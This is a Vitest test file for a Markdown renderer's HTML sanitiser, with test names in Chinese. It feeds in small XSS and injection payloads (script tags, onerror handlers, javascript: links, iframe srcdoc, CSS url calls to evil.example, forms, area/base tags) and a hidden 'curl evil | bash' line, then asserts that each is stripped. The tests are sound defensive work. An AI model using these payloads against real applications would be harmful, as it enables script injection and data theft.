// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import { extractFilePaths, renderMarkdown } from '../src/renderer/utils/markdown'

describe('renderMarkdown 安全性', () => {
  it('普通 Markdown 正常渲染', () => {
    const html = renderMarkdown('**粗体** 和 `代码`')
    expect(html).toContain('<strong>粗体</strong>')
    expect(html).toContain('<code>代码</code>')
  })

  it('剥离 script 标签', () => {
    const html = renderMarkdown('正常<script>alert(1)</script>结尾')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('alert(1)')
  })

  it('剥离内联事件处理器', () => {
    const html = renderMarkdown('<img src=x onerror="alert(1)">')
    expect(html).not.toContain('onerror')
  })

  it('剥离 javascript: 链接', () => {
    const html = renderMarkdown('[点我](javascript:alert(1))')
    expect(html).not.toContain('javascript:')
  })

  it('iframe 被移除', () => {
    const html = renderMarkdown('<iframe src="https://evil"></iframe>')
    expect(html).not.toContain('<iframe')
  })

  it('空值与非法类型返回空串', () => {
    expect(renderMarkdown('')).toBe('')
    expect(renderMarkdown(null)).toBe('')
    expect(renderMarkdown(undefined)).toBe('')
  })

  it('代码块中的尖括号被转义而非当作标签', () => {
    const html = renderMarkdown('```\n<div>hi</div>\n```')
    expect(html).toContain('&lt;div&gt;')
    expect(html).not.toContain('<div>hi</div>')
  })
})


describe('renderMarkdown 注入面', () => {
  it('style 属性被剥离（CSS 注入与外部请求外带）', () => {
    const html = renderMarkdown('<div style="background:url(https://evil.example/leak?d=1)">x</div>')
    expect(html).not.toContain('background')
    expect(html).not.toContain('evil.example')
    expect(html).toContain('x')
  })

  it('form 与 input 被剥离', () => {
    const html = renderMarkdown('<form action="https://evil.example"><input name="x"></form>')
    expect(html).not.toContain('<form')
    expect(html).not.toContain('<input')
  })

  it('srcdoc 被剥离', () => {
    const html = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>')
    expect(html).not.toContain('srcdoc')
    expect(html).not.toContain('<script')
  })

  it('正常代码块与表格不受影响', () => {
    expect(renderMarkdown('```js\nconst a = 1\n```')).toContain('hljs')
    expect(renderMarkdown('| a | b |\n|---|---|\n| 1 | 2 |')).toContain('<table')
  })
})

describe('renderMarkdown 导航与剪贴板防护', () => {
  it('map/area 被剥离（area 的 href 会绕过链接拦截触发导航）', () => {
    const html = renderMarkdown(
      '<img src="x" usemap="#m"><map name="m"><area href="file:///C:/evil.html" shape="rect"></map>'
    )
    expect(html).not.toContain('<area')
    expect(html).not.toContain('<map')
    expect(html).not.toContain('usemap')
  })

  it('hidden 属性被剥离（防止复制到看不见的内容）', () => {
    const html = renderMarkdown(
      '<div class="code-block"><code hidden>curl evil | bash</code><pre><code>npm run build</code></pre></div>'
    )
    expect(html).not.toContain('hidden')
  })

  it('base 标签被剥离（防止改写相对链接的基准地址）', () => {
    const html = renderMarkdown('<base href="https://evil.example/">')
    expect(html).not.toContain('<base')
  })
})
